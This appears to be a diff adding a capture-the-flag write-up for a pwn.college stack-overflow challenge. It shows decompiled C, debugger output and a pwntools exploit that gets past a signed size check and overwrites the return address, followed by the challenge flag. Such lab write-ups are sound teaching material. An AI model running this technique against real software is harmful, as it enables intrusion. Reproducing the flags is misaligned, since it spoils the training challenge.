@@ -1327,3 +1327,271 @@ target.recvall()
 #### Flag
 
 Flag: `pwn.college{YWYtWHsecMbA0xSnI1_Yfj-kjlB.0VN5IDL5cTNxgzW}`
+
+### Level 4.1
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!
+
+#### Write-up
+
+```c ins={13-17} del={19} collapse={1-9, 23-29}
+__int64 challenge()
+{
+  int *v0; // rax
+  char *v1; // rax
+  size_t nbytes[7]; // [rsp+2Ch] [rbp-44h] BYREF
+  int v4; // [rsp+64h] [rbp-Ch]
+  void *buf; // [rsp+68h] [rbp-8h]
+
+  buf = (char *)nbytes + 4;
+  memset(nbytes, 0, 50);
+  printf("Payload size: ");
+  __isoc99_scanf("%i", nbytes);
+  if ( SLODWORD(nbytes[0]) > 46 )
+  {
+    puts("Provided size is too large!");
+    exit(1);
+  }
+  printf("Send your payload (up to %i bytes)!\n", LODWORD(nbytes[0]));
+  v4 = read(0, buf, LODWORD(nbytes[0]));
+  if ( v4 < 0 )
+  {
+    v0 = __errno_location();
+    v1 = strerror(*v0);
+    printf("ERROR: Failed to read input -- %s!\n", v1);
+    exit(1);
+  }
+  puts("Goodbye!");
+  return 0LL;
+}
+```
+
+和上一题思路相同，都是通过有符号数隐式转换为无符号数绕过 payload 长度判断，然后覆盖返回地址。几乎没区别，这里就不再赘述分析过程了。
+
+```asm wrap=false ins="0x0000000000401704" collapse={2-21, 29-30, 36-90, 109-128, 133-162}
+pwndbg> i fun
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000401000  _init
+0x00000000004010f0  putchar@plt
+0x0000000000401100  __errno_location@plt
+0x0000000000401110  puts@plt
+0x0000000000401120  write@plt
+0x0000000000401130  printf@plt
+0x0000000000401140  geteuid@plt
+0x0000000000401150  read@plt
+0x0000000000401160  setvbuf@plt
+0x0000000000401170  open@plt
+0x0000000000401180  __isoc99_scanf@plt
+0x0000000000401190  exit@plt
+0x00000000004011a0  strerror@plt
+0x00000000004011b0  _start
+0x00000000004011e0  _dl_relocate_static_pie
+0x00000000004011f0  deregister_tm_clones
+0x0000000000401220  register_tm_clones
+0x0000000000401260  __do_global_dtors_aux
+0x0000000000401290  frame_dummy
+0x0000000000401296  bin_padding
+0x0000000000401704  win
+0x000000000040180b  challenge
+0x0000000000401921  main
+0x0000000000401a00  __libc_csu_init
+0x0000000000401a70  __libc_csu_fini
+0x0000000000401a78  _fini
+pwndbg> disass challenge
+Dump of assembler code for function challenge:
+   0x000000000040180b <+0>: endbr64
+   0x000000000040180f <+4>: push   rbp
+   0x0000000000401810 <+5>: mov    rbp,rsp
+   0x0000000000401813 <+8>: sub    rsp,0x70
+   0x0000000000401817 <+12>: mov    DWORD PTR [rbp-0x54],edi
+   0x000000000040181a <+15>: mov    QWORD PTR [rbp-0x60],rsi
+   0x000000000040181e <+19>: mov    QWORD PTR [rbp-0x68],rdx
+   0x0000000000401822 <+23>: mov    QWORD PTR [rbp-0x40],0x0
+   0x000000000040182a <+31>: mov    QWORD PTR [rbp-0x38],0x0
+   0x0000000000401832 <+39>: mov    QWORD PTR [rbp-0x30],0x0
+   0x000000000040183a <+47>: mov    QWORD PTR [rbp-0x28],0x0
+   0x0000000000401842 <+55>: mov    QWORD PTR [rbp-0x20],0x0
+   0x000000000040184a <+63>: mov    DWORD PTR [rbp-0x18],0x0
+   0x0000000000401851 <+70>: mov    WORD PTR [rbp-0x14],0x0
+   0x0000000000401857 <+76>: lea    rax,[rbp-0x40]
+   0x000000000040185b <+80>: mov    QWORD PTR [rbp-0x8],rax
+   0x000000000040185f <+84>: mov    DWORD PTR [rbp-0x44],0x0
+   0x0000000000401866 <+91>: lea    rdi,[rip+0x89f]        # 0x40210c
+   0x000000000040186d <+98>: mov    eax,0x0
+   0x0000000000401872 <+103>: call   0x401130 <printf@plt>
+   0x0000000000401877 <+108>: lea    rax,[rbp-0x44]
+   0x000000000040187b <+112>: mov    rsi,rax
+   0x000000000040187e <+115>: lea    rdi,[rip+0x896]        # 0x40211b
+   0x0000000000401885 <+122>: mov    eax,0x0
+   0x000000000040188a <+127>: call   0x401180 <__isoc99_scanf@plt>
+   0x000000000040188f <+132>: mov    eax,DWORD PTR [rbp-0x44]
+   0x0000000000401892 <+135>: cmp    eax,0x2e
+   0x0000000000401895 <+138>: jle    0x4018ad <challenge+162>
+   0x0000000000401897 <+140>: lea    rdi,[rip+0x880]        # 0x40211e
+   0x000000000040189e <+147>: call   0x401110 <puts@plt>
+   0x00000000004018a3 <+152>: mov    edi,0x1
+   0x00000000004018a8 <+157>: call   0x401190 <exit@plt>
+   0x00000000004018ad <+162>: mov    eax,DWORD PTR [rbp-0x44]
+   0x00000000004018b0 <+165>: mov    esi,eax
+   0x00000000004018b2 <+167>: lea    rdi,[rip+0x887]        # 0x402140
+   0x00000000004018b9 <+174>: mov    eax,0x0
+   0x00000000004018be <+179>: call   0x401130 <printf@plt>
+   0x00000000004018c3 <+184>: mov    eax,DWORD PTR [rbp-0x44]
+   0x00000000004018c6 <+187>: mov    edx,eax
+   0x00000000004018c8 <+189>: mov    rax,QWORD PTR [rbp-0x8]
+   0x00000000004018cc <+193>: mov    rsi,rax
+   0x00000000004018cf <+196>: mov    edi,0x0
+   0x00000000004018d4 <+201>: call   0x401150 <read@plt>
+   0x00000000004018d9 <+206>: mov    DWORD PTR [rbp-0xc],eax
+   0x00000000004018dc <+209>: cmp    DWORD PTR [rbp-0xc],0x0
+   0x00000000004018e0 <+213>: jns    0x40190e <challenge+259>
+   0x00000000004018e2 <+215>: call   0x401100 <__errno_location@plt>
+   0x00000000004018e7 <+220>: mov    eax,DWORD PTR [rax]
+   0x00000000004018e9 <+222>: mov    edi,eax
+   0x00000000004018eb <+224>: call   0x4011a0 <strerror@plt>
+   0x00000000004018f0 <+229>: mov    rsi,rax
+   0x00000000004018f3 <+232>: lea    rdi,[rip+0x86e]        # 0x402168
+   0x00000000004018fa <+239>: mov    eax,0x0
+   0x00000000004018ff <+244>: call   0x401130 <printf@plt>
+   0x0000000000401904 <+249>: mov    edi,0x1
+   0x0000000000401909 <+254>: call   0x401190 <exit@plt>
+   0x000000000040190e <+259>: lea    rdi,[rip+0x877]        # 0x40218c
+   0x0000000000401915 <+266>: call   0x401110 <puts@plt>
+   0x000000000040191a <+271>: mov    eax,0x0
+   0x000000000040191f <+276>: leave
+   0x0000000000401920 <+277>: ret
+End of assembler dump.
+pwndbg> b *challenge+201
+Breakpoint 1 at 0x4018d4
+pwndbg> r
+Starting program: /home/cub3y0nd/Projects/pwn.college/babymem-level-4-1
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/usr/lib/libthread_db.so.1".
+###
+### Welcome to /home/cub3y0nd/Projects/pwn.college/babymem-level-4-1!
+###
+
+Payload size: 16
+Send your payload (up to 16 bytes)!
+
+Breakpoint 1, 0x00000000004018d4 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────
+ RAX  0x7fffffffd170 ◂— 0
+ RBX  0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-4-1'
+ RCX  0
+ RDX  0x10
+ RDI  0
+ RSI  0x7fffffffd170 ◂— 0
+ R8   0x69
+ R9   0xfffffffe
+ R10  0
+ R11  0x202
+ R12  1
+ R13  0
+ R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
+ R15  0
+ RBP  0x7fffffffd1b0 —▸ 0x7fffffffe1e0 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2e0 ◂— 0
+ RSP  0x7fffffffd140 —▸ 0x7fffffffd170 ◂— 0
+ RIP  0x4018d4 (challenge+201) ◂— call 0x401150
+────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────
+ ► 0x4018d4 <challenge+201>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/2)
+        buf: 0x7fffffffd170 ◂— 0
+        nbytes: 0x10
+
+   0x4018d9 <challenge+206>    mov    dword ptr [rbp - 0xc], eax
+   0x4018dc <challenge+209>    cmp    dword ptr [rbp - 0xc], 0
+   0x4018e0 <challenge+213>    jns    challenge+259               <challenge+259>
+
+   0x4018e2 <challenge+215>    call   __errno_location@plt        <__errno_location@plt>
+
+   0x4018e7 <challenge+220>    mov    eax, dword ptr [rax]
+   0x4018e9 <challenge+222>    mov    edi, eax
+   0x4018eb <challenge+224>    call   strerror@plt                <strerror@plt>
+
+   0x4018f0 <challenge+229>    mov    rsi, rax
+   0x4018f3 <challenge+232>    lea    rdi, [rip + 0x86e]     RDI => 0x402168 ◂— 'ERROR: Failed to read input -- %s!\n'
+   0x4018fa <challenge+239>    mov    eax, 0                 EAX => 0
+──────────────────────────────────────[ STACK ]──────────────────────────────────────
+00:0000│ rsp     0x7fffffffd140 —▸ 0x7fffffffd170 ◂— 0
+01:0008│-068     0x7fffffffd148 —▸ 0x7fffffffe318 —▸ 0x7fffffffe6f1 ◂— 'SHELL=/usr/bin/zsh'
+02:0010│-060     0x7fffffffd150 —▸ 0x7fffffffe308 —▸ 0x7fffffffe6bb ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-4-1'
+03:0018│-058     0x7fffffffd158 ◂— 0x10000000a /* '\n' */
+04:0020│-050     0x7fffffffd160 —▸ 0x7ffff7f8d5c0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+05:0028│-048     0x7fffffffd168 ◂— 0x1000404020 /* ' @@' */
+06:0030│ rax rsi 0x7fffffffd170 ◂— 0
+07:0038│-038     0x7fffffffd178 ◂— 0
+────────────────────────────────────[ BACKTRACE ]────────────────────────────────────
+ ► 0         0x4018d4 challenge+201
+   1         0x4019e7 main+198
+   2   0x7ffff7dcae08
+   3   0x7ffff7dcaecc __libc_start_main+140
+   4         0x4011de _start+46
+─────────────────────────────────────────────────────────────────────────────────────
+pwndbg> i frame
+Stack level 0, frame at 0x7fffffffd1c0:
+ rip = 0x4018d4 in challenge; saved rip = 0x4019e7
+ called by frame at 0x7fffffffe1f0
+ Arglist at 0x7fffffffd1b0, args:
+ Locals at 0x7fffffffd1b0, Previous frame's sp is 0x7fffffffd1c0
+ Saved registers:
+  rbp at 0x7fffffffd1b0, rip at 0x7fffffffd1b8
+pwndbg> distance 0x7fffffffd170 0x7fffffffd1b8
+0x7fffffffd170->0x7fffffffd1b8 is 0x48 bytes (0x9 words)
+```
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import context, ELF, process, remote, gdb, p64
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-4-1"
+HOST = "pwn.college"
+PORT = 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug([elf.path], gdbscript=gdbscript)
+        else:
+            return process([elf.path])
+    else:
+        return remote(HOST, PORT)
+
+
+target = launch()
+
+payload = b"".ljust(0x48, b"A") + p64(0x401704)
+
+target.recvuntil(b"Payload size: ")
+target.sendline(b"-1")
+target.recvuntil(b"Send your payload")
+target.send(payload)
+
+target.recvall()
+```
+
+#### Flag
+
+Flag: `pwn.college{M-FCJzqtx7cmDX7yqpyi7jADAMM.0lN5IDL5cTNxgzW}`
